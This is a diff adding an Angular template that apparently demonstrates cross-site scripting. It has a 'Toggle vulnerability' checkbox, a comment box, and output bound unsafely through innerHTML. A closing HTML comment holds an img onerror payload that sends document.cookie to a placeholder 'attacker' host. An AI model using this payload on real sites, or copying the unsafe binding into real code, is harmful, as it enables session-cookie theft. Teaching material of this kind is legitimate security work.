@@ -1,0 +1,14 @@
+<div class="m-1 p-1">
+  <div>
+    <input id="vulnerable" [(ngModel)]="isVulnerable" type="checkbox" />
+    <label for="vulnerable">Toggle vulnerability</label>
+  </div>
+
+  <div class="mt">
+    <textarea [(ngModel)]="textarea"></textarea>
+    <button (click)="injectHtml()" class="block">Add comment</button>
+    <div [innerHTML]="htmltext" #textareaInjection></div>
+  </div>
+</div>
+
+<!-- <img src onerror="window.location='http://attacker/?cookie='+document.cookie"> -->
